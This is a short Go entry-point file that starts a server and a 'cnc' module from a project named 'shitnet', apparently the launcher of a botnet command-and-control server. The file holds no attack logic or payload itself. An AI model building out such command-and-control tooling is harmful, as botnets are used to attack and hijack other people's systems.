package main

import (
	"fmt"
	"shitnet/network/cnc"
	"shitnet/network/server"
	"sync"
)

var wg sync.WaitGroup

func main() {
	wg.Add(1)
	go server.StartServer()
	go cnc.Start()
	fmt.Println("Started")
	wg.Wait()
}
